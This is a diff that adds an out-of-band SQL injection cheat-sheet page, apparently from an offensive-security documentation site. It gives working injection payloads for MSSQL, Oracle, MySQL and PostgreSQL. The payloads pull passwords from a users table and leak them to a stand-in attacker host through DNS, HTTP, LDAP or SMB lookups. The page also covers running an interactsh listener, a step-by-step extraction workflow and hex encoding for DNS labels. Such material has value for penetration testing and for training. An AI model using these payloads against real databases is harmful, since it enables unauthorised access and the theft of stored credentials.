@@ -1,0 +1,124 @@
+---
+title: Out-of-band SQLi
+description: Exfiltrating data via DNS or HTTP when no in-band feedback is available.
+mitre: [T1190, T1213, T1071.004]
+d3fend: [D3-MH, D3-OTF, D3-NTA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 8
+  label: Out-of-band
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+<Aside type="note">
+This page is a known stub. It will be expanded with detailed payloads and case studies as more source material becomes available.
+</Aside>
+
+When the application returns no error, no reflected output, no behavioural change, and no observable timing difference, the database can still leak data - by making it talk to a server you control. Trigger a DNS lookup or HTTP request from the database and read the data on your end.
+
+## TL;DR
+
+<Tabs syncKey="dbms">
+  <TabItem label="MSSQL">
+    ```sql
+    '; DECLARE @data varchar(1024); SELECT @data = (SELECT TOP 1 password FROM users);
+       EXEC('master..xp_dirtree "\\'+@data+'.<ATTACKER>\share"')-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle (HTTP)">
+    ```sql
+    ' || (SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE rownum=1)||'.<ATTACKER>') FROM dual)-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle (LDAP)">
+    ```sql
+    ' || (SELECT DBMS_LDAP.INIT((SELECT password FROM users WHERE rownum=1)||'.<ATTACKER>',80) FROM dual)-- -
+    ```
+  </TabItem>
+  <TabItem label="MySQL (Windows)">
+    ```sql
+    -- UNC path triggers SMB lookup; Windows MySQL only
+    ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.<ATTACKER>\\share'))-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    -- Requires superuser
+    '; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT password FROM users LIMIT 1)||'.<ATTACKER>'-- -
+    ```
+  </TabItem>
+</Tabs>
+
+## When to use
+
+| Condition | Use OOB? |
+|---|---|
+| Visible errors / output | No - use [UNION-based](../union-based/) |
+| Boolean oracle works | No - use [Boolean blind](../blind-boolean/) |
+| Time delays measurable | No - use [Time blind](../blind-time/) |
+| None of the above + DB has egress | **Yes** |
+
+<Aside type="caution">
+OOB requires the database server to reach the internet. Many production databases are firewalled and cannot. DNS often gets through where HTTP doesn't.
+</Aside>
+
+## Setting up the listener
+
+Use [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator), [interactsh](https://github.com/projectdiscovery/interactsh), or your own DNS server.
+
+```bash
+# interactsh
+interactsh-client
+# Returns a unique <id>.oast.fun (or similar) host
+# Use this in payloads as <ATTACKER>
+```
+
+Each DNS lookup or HTTP request to `<extracted_data>.<id>.oast.fun` shows up in the client output, with the leaked data as a subdomain label.
+
+## Workflow
+
+<Steps>
+
+1. **Confirm OOB egress** - fire a payload that just triggers a callback with a static value:
+   ```sql
+   ' || (SELECT UTL_HTTP.REQUEST('http://test.<ATTACKER>') FROM dual)-- -
+   ```
+   If `test.<ATTACKER>` shows up in your collaborator, the DB can egress.
+
+2. **Replace the static value with a query** - extract data:
+   ```sql
+   ' || (SELECT UTL_HTTP.REQUEST('http://'||(SELECT password FROM users WHERE rownum=1)||'.<ATTACKER>') FROM dual)-- -
+   ```
+
+3. **Read the leaked data** in the collaborator/interactsh output. The subdomain label *is* the extracted value.
+
+</Steps>
+
+## DNS character restrictions
+
+DNS labels allow only `a-z 0-9 -` and are limited to 63 chars per label. Encode binary data as hex:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL">
+    ```sql
+    ' UNION SELECT LOAD_FILE(CONCAT('\\\\', HEX((SELECT password FROM users LIMIT 1)), '.<ATTACKER>\\share'))-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' || (SELECT UTL_HTTP.REQUEST('http://' || RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT password FROM users WHERE rownum=1))) || '.<ATTACKER>') FROM dual)-- -
+    ```
+  </TabItem>
+</Tabs>
+
+For data > 63 chars, split into chunks across multiple labels or multiple lookups.
+
+## Notes
+
+- OOB is the slowest but most reliable extraction class for fully-blind targets.
+- DNS exfil is preferred over HTTP - UDP/53 is rarely blocked outbound, even when 80/443 are.
+- This is one of the few SQLi classes that requires the database server to have outbound network access. Fully-isolated databases cannot be exfiltrated this way.
+- For large extractions, prefer building a small bash loop that splits the data at the SQL layer and pages through it, rather than trying to fit everything into one DNS label.
+
+{/* STUB: expand with PostgreSQL DNS via dblink, MySQL UDF abuse, MSSQL xp_fileexist tricks, and full case studies */}
